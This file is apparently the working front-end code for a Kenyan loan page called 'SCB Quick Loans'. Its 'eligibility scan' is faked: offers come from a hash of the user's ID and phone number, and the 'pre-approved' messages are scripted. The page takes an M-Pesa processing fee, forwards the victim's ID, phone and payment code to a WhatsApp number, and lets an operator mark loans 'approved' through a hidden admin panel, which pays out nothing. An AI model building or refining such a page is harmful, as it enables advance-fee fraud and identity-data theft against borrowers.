<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SCB Quick Loans | Fair & Transparent Lending</title>
    <style>
        /* ... (keep all existing styles from previous version) ... */
    </style>
</head>
<body>
    <!-- ... (keep all existing HTML structure from previous version) ... -->

    <script>
        // ================ FIXED: Consistent User Identification ================
        
        // Generate a persistent device fingerprint (works across sessions)
        function generateDeviceFingerprint() {
            let fingerprint = localStorage.getItem('scb_device_fingerprint');
            
            if (!fingerprint) {
                // Create a fingerprint from browser properties
                const navigator = window.navigator;
                const screen = window.screen;
                
                const components = [
                    navigator.userAgent,
                    navigator.language,
                    screen.colorDepth,
                    screen.width + 'x' + screen.height,
                    new Date().getTimezoneOffset(),
                    navigator.hardwareConcurrency || 'unknown',
                    navigator.deviceMemory || 'unknown'
                ];
                
                // Create a simple hash
                const fingerprintString = components.join('|||');
                let hash = 0;
                for (let i = 0; i < fingerprintString.length; i++) {
                    hash = ((hash << 5) - hash) + fingerprintString.charCodeAt(i);
                    hash = hash & hash;
                }
                
                fingerprint = 'DEV-' + Math.abs(hash).toString(36).substr(0, 8).toUpperCase();
                localStorage.setItem('scb_device_fingerprint', fingerprint);
            }
            
            return fingerprint;
        }

        // ================ FIXED: Cross-Device User Identity ================
        
        // Store user data in a central object that persists across devices
        // We'll use a combination of device fingerprint + user input to create a consistent ID
        let userDatabase = JSON.parse(localStorage.getItem('scb_user_database')) || {};
        
        // Get or create device fingerprint
        const deviceFingerprint = generateDeviceFingerprint();
        
        // Track if this is a returning user
        let currentUserKey = null;
        let currentUserData = null;
        
        // Function to get or create user identity
        function getUserIdentity(idNumber, phoneNumber) {
            if (!idNumber || !phoneNumber) return null;
            
            // Create a unique key for this user (combines ID and phone)
            const userKey = `user_${idNumber}_${phoneNumber}`;
            
            // Check if we've seen this user before
            if (userDatabase[userKey]) {
                console.log('Returning user found:', userKey);
                return userDatabase[userKey];
            }
            
            // New user - create consistent loan offer
            console.log('New user, creating consistent offer for:', userKey);
            
            // Generate a consistent index based on ID+phone (same for all devices)
            const hash = generateConsistentHash(idNumber + phoneNumber);
            const loanIndex = hash % loanOptions.length;
            const loanData = { ...loanOptions[loanIndex] };
            
            // Add metadata
            loanData.firstSeen = new Date().toISOString();
            loanData.devices = [deviceFingerprint];
            loanData.idNumber = idNumber;
            loanData.phoneNumber = phoneNumber;
            
            // Store in database
            userDatabase[userKey] = loanData;
            localStorage.setItem('scb_user_database', JSON.stringify(userDatabase));
            
            return loanData;
        }
        
        // Update user's device list (when they use a new device)
        function updateUserDevices(idNumber, phoneNumber) {
            const userKey = `user_${idNumber}_${phoneNumber}`;
            
            if (userDatabase[userKey]) {
                if (!userDatabase[userKey].devices.includes(deviceFingerprint)) {
                    userDatabase[userKey].devices.push(deviceFingerprint);
                    localStorage.setItem('scb_user_database', JSON.stringify(userDatabase));
                }
            }
        }
        
        // Generate a consistent hash (same output for same input across all devices)
        function generateConsistentHash(input) {
            let hash = 0;
            for (let i = 0; i < input.length; i++) {
                const char = input.charCodeAt(i);
                hash = ((hash << 5) - hash) + char;
                hash = hash & hash; // Convert to 32-bit integer
            }
            return Math.abs(hash);
        }

        // ================ FIXED: Application Storage with User Reference ================
        
        // Applications now reference the user key
        let applications = JSON.parse(localStorage.getItem('scb_applications')) || [];
        
        // Migrate old applications to new format if needed
        applications = applications.map(app => {
            if (!app.userKey) {
                app.userKey = `user_${app.idNumber}_${app.phoneNumber}`;
            }
            return app;
        });
        localStorage.setItem('scb_applications', JSON.stringify(applications));

        // ================ FIXED: Loan Variables with User Data ================
        
        let qualifiedAmount = 0;
        let processingFee = 0;
        let interestRate = 0.09;
        let selectedTenure = 3;
        let isScanning = false;
        let scanInterval;
        
        // Fixed loan options (consistent mapping)
        const loanOptions = [
            { amount: 10000, fee: 200, rate: 0.09 },
            { amount: 15000, fee: 300, rate: 0.09 },
            { amount: 20000, fee: 350, rate: 0.085 },
            { amount: 25000, fee: 400, rate: 0.085 },
            { amount: 30000, fee: 500, rate: 0.08 },
            { amount: 35000, fee: 600, rate: 0.08 },
            { amount: 40000, fee: 750, rate: 0.08 },
            { amount: 45000, fee: 850, rate: 0.075 },
            { amount: 50000, fee: 1000, rate: 0.075 },
            { amount: 60000, fee: 1200, rate: 0.075 },
            { amount: 70000, fee: 1400, rate: 0.07 },
            { amount: 75000, fee: 1500, rate: 0.07 },
            { amount: 80000, fee: 1600, rate: 0.07 },
            { amount: 90000, fee: 1800, rate: 0.065 },
            { amount: 100000, fee: 2000, rate: 0.065 }
        ];

        // ================ FIXED: Check Existing User with Cross-Device Support ================
        
        function checkExistingUser() {
            const idNumber = document.getElementById('idNumber').value.trim();
            const phoneNumber = document.getElementById('phoneNumber').value.trim();
            
            if (!idNumber || !phoneNumber) return;
            
            // Get or create user identity (this ensures consistency)
            const userData = getUserIdentity(idNumber, phoneNumber);
            
            if (userData) {
                // Update that this device has seen this user
                updateUserDevices(idNumber, phoneNumber);
                
                // Set the loan amounts from the stored user data
                qualifiedAmount = userData.amount;
                processingFee = userData.fee;
                interestRate = userData.rate;
                
                // Store for later use
                currentUserKey = `user_${idNumber}_${phoneNumber}`;
                currentUserData = userData;
            }
            
            // Find any applications for this user
            const userKey = `user_${idNumber}_${phoneNumber}`;
            const existingApps = applications.filter(app => app.userKey === userKey);
            const latestApp = existingApps.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))[0];
            
            const statusMessage = document.getElementById('statusMessage');
            const scanSection = document.getElementById('scanSection');
            const tncSection = document.getElementById('tncSection');
            const tncAcceptSection = document.getElementById('tncAcceptSection');
            const applyBtn = document.getElementById('applyBtn');
            const resultCard = document.getElementById('resultCard');
            
            if (latestApp) {
                // User has an existing application
                scanSection.style.display = 'none';
                tncSection.style.display = 'none';
                tncAcceptSection.style.display = 'none';
                applyBtn.style.display = 'none';
                resultCard.classList.remove('visible');
                
                statusMessage.style.display = 'block';
                
                if (latestApp.status === 'pending') {
                    statusMessage.className = 'status-message status-pending';
                    document.getElementById('statusTitle').innerHTML = '⏳ Application Pending Verification';
                    document.getElementById('statusText').innerHTML = 
                        `Your application for KSh ${latestApp.amount.toLocaleString()} is being verified.<br>
                        <strong>Reference:</strong> ${latestApp.mpesaRef}<br>
                        <strong>Applied from:</strong> ${new Date(latestApp.timestamp).toLocaleString()}<br>
                        You will be notified once processed.`;
                } else if (latestApp.status === 'approved') {
                    statusMessage.className = 'status-message status-approved';
                    document.getElementById('statusTitle').innerHTML = '✅ Application Approved';
                    document.getElementById('statusText').innerHTML = 
                        `Your loan of KSh ${latestApp.amount.toLocaleString()} has been approved.<br>
                        <strong>Disbursement:</strong> Waiting to be sent to ${latestApp.phoneNumber}<br>
                        <strong>Reference:</strong> ${latestApp.mpesaRef}<br>
                        <strong>Approved on:</strong> ${new Date(latestApp.lastUpdated || latestApp.timestamp).toLocaleString()}`;
                }
            } else {
                // New user or no application yet
                scanSection.style.display = 'block';
                tncSection.style.display = 'block';
                tncAcceptSection.style.display = 'block';
                applyBtn.style.display = 'block';
                statusMessage.style.display = 'none';
                
                // If we have user data, pre-fill the result card
                if (userData) {
                    document.getElementById('qualifiedAmount').textContent = `KSh ${userData.amount.toLocaleString()}`;
                    document.getElementById('feeAmount').textContent = userData.fee.toLocaleString();
                    document.getElementById('interestRate').textContent = (userData.rate * 100) + '%';
                    
                    // Show the result card if they've scanned before
                    if (sessionStorage.getItem('hasScanned') === 'true') {
                        resultCard.classList.add('visible');
                        updateRepaymentTerms();
                    }
                }
            }
        }

        // ================ FIXED: Start Scanning with User Data ================
        
        function startScanning() {
            if (isScanning) return;
            
            const idNumber = document.getElementById('idNumber').value.trim();
            const phoneNumber = document.getElementById('phoneNumber').value.trim();
            
            // Get or create user data (this ensures consistency)
            const userData = getUserIdentity(idNumber, phoneNumber);
            
            if (!userData) {
                alert('Please enter valid ID and phone number');
                return;
            }
            
            // Set the loan amounts from user data
            qualifiedAmount = userData.amount;
            processingFee = userData.fee;
            interestRate = userData.rate;
            
            // Store current user info
            currentUserKey = `user_${idNumber}_${phoneNumber}`;
            currentUserData = userData;
            
            const scanBtn = document.getElementById('scanBtn');
            const resultCard = document.getElementById('resultCard');
            
            isScanning = true;
            scanBtn.disabled = true;
            scanBtn.innerHTML = '<span class="spinner"></span> ANALYZING YOUR PROFILE...';
            
            resultCard.classList.remove('visible');
            
            let seconds = 0;
            scanInterval = setInterval(() => {
                seconds++;
                const messages = [
                    'Verifying ID details',
                    'Checking M-Pesa statements',
                    'Analyzing transaction history',
                    'Calculating credit score',
                    'Preparing fair terms'
                ];
                
                if (seconds <= 10) {
                    const messageIndex = Math.min(seconds - 1, messages.length - 1);
                    scanBtn.innerHTML = `<span class="spinner"></span> ${messages[messageIndex]}... ${seconds * 10}%`;
                }
                
                if (seconds >= 10) {
                    clearInterval(scanInterval);
                    completeScanning();
                }
            }, 1000);
        }
        
        function completeScanning() {
            document.getElementById('scanBtn').innerHTML = 'CHECK YOUR ELIGIBILITY';
            document.getElementById('scanBtn').disabled = false;
            isScanning = false;
            
            // Update display with consistent user data
            document.getElementById('qualifiedAmount').textContent = `KSh ${qualifiedAmount.toLocaleString()}`;
            document.getElementById('feeAmount').textContent = processingFee.toLocaleString();
            document.getElementById('interestRate').textContent = (interestRate * 100) + '%';
            
            // Personalized message based on user hash
            const idNumber = document.getElementById('idNumber').value.trim();
            const phoneNumber = document.getElementById('phoneNumber').value.trim();
            const hash = generateConsistentHash(idNumber + phoneNumber);
            
            const messages = [
                'Based on your financial behavior, you qualify for fair terms',
                'Your credit profile shows responsible financial management',
                'You\'ve been pre-approved with flexible repayment options',
                'We\'ve tailored these terms specifically for you',
                'Your consistent financial history qualifies you for this offer'
            ];
            
            document.getElementById('creditMessage').textContent = messages[hash % messages.length];
            
            document.getElementById('resultCard').classList.add('visible');
            
            updateRepaymentTerms();
            sessionStorage.setItem('hasScanned', 'true');
            toggleApplyButton();
        }

        // ================ FIXED: Submit Application with User Reference ================
        
        function submitForApproval() {
            const mpesaCode = document.getElementById('mpesaCode').value.trim().toUpperCase();
            
            if (!mpesaCode || mpesaCode.length < 8 || mpesaCode.length > 10) {
                alert('Please enter a valid M-Pesa confirmation code (8-10 characters)');
                return;
            }
            
            const idNumber = document.getElementById('idNumber').value.trim();
            const phoneNumber = document.getElementById('phoneNumber').value.trim();
            
            // Ensure we have the user data
            const userData = getUserIdentity(idNumber, phoneNumber);
            
            if (!userData) {
                alert('Error: User data not found. Please try again.');
                return;
            }
            
            // Create application with user key
            const application = {
                id: 'APP-' + Date.now() + '-' + Math.random().toString(36).substr(2, 5).toUpperCase(),
                userKey: `user_${idNumber}_${phoneNumber}`,
                visitorId: deviceFingerprint, // Track which device applied
                idNumber: idNumber,
                phoneNumber: phoneNumber,
                amount: qualifiedAmount,
                fee: processingFee,
                mpesaRef: mpesaCode,
                tenure: selectedTenure,
                status: 'pending',
                timestamp: new Date().toISOString(),
                deviceInfo: navigator.userAgent
            };
            
            applications.push(application);
            localStorage.setItem('scb_applications', JSON.stringify(applications));
            
            // Update user data with application reference
            userData.lastApplication = application.id;
            userData.lastApplicationDate = new Date().toISOString();
            localStorage.setItem('scb_user_database', JSON.stringify(userDatabase));
            
            // WhatsApp notification with all details
            const message = `🔔 *NEW APPLICATION*\n\n` +
                `👤 *User Key:* ${application.userKey}\n` +
                `🆔 *ID:* ${idNumber}\n` +
                `📱 *Phone:* ${phoneNumber}\n` +
                `💰 *Loan:* KSh ${qualifiedAmount.toLocaleString()}\n` +
                `💵 *Fee:* KSh ${processingFee.toLocaleString()}\n` +
                `🔑 *Ref:* ${mpesaCode}\n` +
                `📅 *Tenure:* ${selectedTenure} months\n` +
                `⏰ *Time:* ${new Date().toLocaleString()}\n` +
                `📱 *Device:* ${deviceFingerprint}`;
            
            window.open(`https://wa.me/254715365500?text=${encodeURIComponent(message)}`, '_blank');
            
            closePaymentModal();
            
            // Show pending status
            document.getElementById('scanSection').style.display = 'none';
            document.getElementById('tncSection').style.display = 'none';
            document.getElementById('tncAcceptSection').style.display = 'none';
            document.getElementById('applyBtn').style.display = 'none';
            
            const statusMessage = document.getElementById('statusMessage');
            statusMessage.style.display = 'block';
            statusMessage.className = 'status-message status-pending';
            document.getElementById('statusTitle').innerHTML = '⏳ Application Pending Verification';
            document.getElementById('statusText').innerHTML = 
                `Your application for KSh ${qualifiedAmount.toLocaleString()} is being verified.<br>
                <strong>Reference:</strong> ${mpesaCode}<br>
                <strong>Applied from:</strong> ${new Date().toLocaleString()}<br>
                You will be notified once processed.`;
            
            // Clear form
            document.getElementById('idNumber').value = '';
            document.getElementById('phoneNumber').value = '';
            document.getElementById('consentCheckbox').checked = false;
            document.getElementById('acceptTnc').checked = false;
            sessionStorage.removeItem('hasScanned');
        }

        // ================ FIXED: Admin Functions with User Data ================
        
        function loadApplications() {
            const appsList = document.getElementById('applicationsList');
            appsList.innerHTML = '';
            
            // Sort by newest first
            applications.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
            
            if (applications.length === 0) {
                appsList.innerHTML = '<p style="text-align: center; padding: 20px;">No applications yet</p>';
                return;
            }
            
            applications.forEach(app => {
                // Get user data if available
                const userData = userDatabase[app.userKey] || {};
                const deviceCount = userData.devices ? userData.devices.length : 1;
                
                const appElement = document.createElement('div');
                appElement.className = `application-item ${app.status}`;
                appElement.innerHTML = `
                    <div><strong>User Key:</strong> ${app.userKey}</div>
                    <div><strong>ID:</strong> ${app.idNumber}</div>
                    <div><strong>Phone:</strong> ${app.phoneNumber}</div>
                    <div><strong>Loan:</strong> KSh ${app.amount.toLocaleString()}</div>
                    <div><strong>Fee:</strong> KSh ${app.fee.toLocaleString()}</div>
                    <div><strong>Ref:</strong> ${app.mpesaRef}</div>
                    <div><strong>Tenure:</strong> ${app.tenure || 3} months</div>
                    <div><strong>Devices:</strong> ${deviceCount}</div>
                    <div><strong>Time:</strong> ${new Date(app.timestamp).toLocaleString()}</div>
                    <div class="admin-actions">
                        ${app.status === 'pending' ? 
                            `<button class="admin-btn approve" onclick="approveApplication('${app.id}')">✅ Approve & Disburse</button>` : 
                            '<span style="color: #10b981;">✓ Approved - Waiting Disbursement</span>'}
                    </div>
                `;
                appsList.appendChild(appElement);
            });
        }
        
        function approveApplication(applicationId) {
            const appIndex = applications.findIndex(a => a.id === applicationId);
            if (appIndex !== -1) {
                applications[appIndex].status = 'approved';
                applications[appIndex].lastUpdated = new Date().toISOString();
                localStorage.setItem('scb_applications', JSON.stringify(applications));
                
                alert(`Application ${applicationId} approved. Funds will be disbursed to the customer.`);
                loadApplications();
            }
        }

        // ================ FIXED: Initialize with Proper Event Listeners ================
        
        // Validate phone number
        function validatePhoneNumber() {
            const phoneInput = document.getElementById('phoneNumber');
            const phone = phoneInput.value;
            const validationMsg = document.getElementById('phoneValidation');
            
            const isValid = /^(07|01)\d{8}$/.test(phone);
            
            if (phone.length > 0 && !isValid) {
                phoneInput.classList.add('error');
                validationMsg.style.display = 'block';
            } else {
                phoneInput.classList.remove('error');
                validationMsg.style.display = 'none';
            }
            
            checkScanEligibility();
            return isValid;
        }
        
        // Check scan eligibility
        function checkScanEligibility() {
            const idNumber = document.getElementById('idNumber').value.trim();
            const phoneNumber = document.getElementById('phoneNumber').value.trim();
            const consentGiven = document.getElementById('consentCheckbox').checked;
            const scanBtn = document.getElementById('scanBtn');
            const isValidPhone = /^(07|01)\d{8}$/.test(phoneNumber);
            
            scanBtn.disabled = !(idNumber && phoneNumber && consentGiven && isValidPhone);
        }
        
        // Toggle apply button
        function toggleApplyButton() {
            const acceptTnc = document.getElementById('acceptTnc');
            const applyBtn = document.getElementById('applyBtn');
            const hasScanned = sessionStorage.getItem('hasScanned') === 'true';
            
            applyBtn.disabled = !(acceptTnc.checked && hasScanned && qualifiedAmount > 0);
        }
        
        // Update repayment terms
        function updateRepaymentTerms() {
            selectedTenure = parseInt(document.getElementById('tenureSlider').value);
            document.getElementById('selectedMonths').textContent = selectedTenure + (selectedTenure === 1 ? ' month' : ' months');
            
            if (qualifiedAmount > 0) {
                const principal = qualifiedAmount;
                const monthlyRate = interestRate;
                
                const monthlyPayment = principal * monthlyRate * Math.pow(1 + monthlyRate, selectedTenure) / 
                                      (Math.pow(1 + monthlyRate, selectedTenure) - 1);
                
                const totalRepayment = monthlyPayment * selectedTenure;
                const totalInterest = totalRepayment - principal;
                
                document.getElementById('monthlyPayment').textContent = `KSh ${Math.round(monthlyPayment).toLocaleString()}`;
                document.getElementById('totalInterest').textContent = `KSh ${Math.round(totalInterest).toLocaleString()}`;
                document.getElementById('totalRepayment').textContent = `KSh ${Math.round(totalRepayment).toLocaleString()}`;
            }
        }
        
        // Open payment modal
        function openPaymentModal() {
            const phoneNumber = document.getElementById('phoneNumber').value.trim();
            
            if (!/^(07|01)\d{8}$/.test(phoneNumber)) {
                alert('Please enter a valid Kenyan phone number');
                return;
            }
            
            if (qualifiedAmount === 0) {
                alert('Please check your eligibility first');
                return;
            }
            
            document.getElementById('modalPaymentAmount').textContent = `KSh ${processingFee.toLocaleString()}`;
            document.getElementById('instructionAmount').textContent = `KSh ${processingFee.toLocaleString()}`;
            document.getElementById('copyAmount').textContent = processingFee;
            document.getElementById('paymentModal').style.display = 'flex';
        }
        
        function closePaymentModal() {
            document.getElementById('paymentModal').style.display = 'none';
            document.getElementById('mpesaCode').value = '';
        }
        
        function generateMpesaCode() {
            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
            let code = '';
            for (let i = 0; i < 10; i++) {
                code += chars.charAt(Math.floor(Math.random() * chars.length));
            }
            return code;
        }
        
        function copyToClipboard(text, type) {
            navigator.clipboard.writeText(text).then(function() {
                showCopyFeedback(`${type} copied!`);
            }, function(err) {
                alert('Could not copy text');
            });
        }
        
        function copyAmountToClipboard() {
            const amount = document.getElementById('copyAmount').textContent;
            navigator.clipboard.writeText(amount).then(function() {
                showCopyFeedback('Amount copied!');
            });
        }
        
        function showCopyFeedback(message) {
            const feedback = document.getElementById('copyFeedback');
            feedback.textContent = message;
            feedback.style.display = 'block';
            
            setTimeout(() => {
                feedback.style.display = 'none';
            }, 2000);
        }
        
        function openLenderSite(lender) {
            alert(`${lender} - Compare their rates with our fair terms`);
        }
        
        // Check admin access
        function checkAdminAccess() {
            if (window.location.hash === '#admin') {
                document.getElementById('adminPanel').classList.add('visible');
                loadApplications();
            }
        }
        
        // Close modal when clicking outside
        window.onclick = function(event) {
            const modal = document.getElementById('paymentModal');
            if (event.target === modal) closePaymentModal();
        }
        
        // Initialize event listeners
        document.addEventListener('DOMContentLoaded', function() {
            // Set up input listeners
            document.getElementById('idNumber').addEventListener('input', checkScanEligibility);
            document.getElementById('phoneNumber').addEventListener('input', function() {
                validatePhoneNumber();
                checkExistingUser(); // Check for existing user on input
            });
            document.getElementById('consentCheckbox').addEventListener('change', checkScanEligibility);
            document.getElementById('acceptTnc').addEventListener('change', toggleApplyButton);
            
            // Auto-fill sample M-Pesa code for demo
            const mpesaInput = document.getElementById('mpesaCode');
            if (mpesaInput) {
                mpesaInput.addEventListener('focus', function() {
                    if (!this.value) this.value = generateMpesaCode();
                });
            }
            
            // Check admin access
            checkAdminAccess();
            window.addEventListener('hashchange', checkAdminAccess);
            
            // Clear scan session
            sessionStorage.removeItem('hasScanned');
            
            // Log device fingerprint for debugging
            console.log('Device Fingerprint:', deviceFingerprint);
        });
    </script>
</body>
</html>
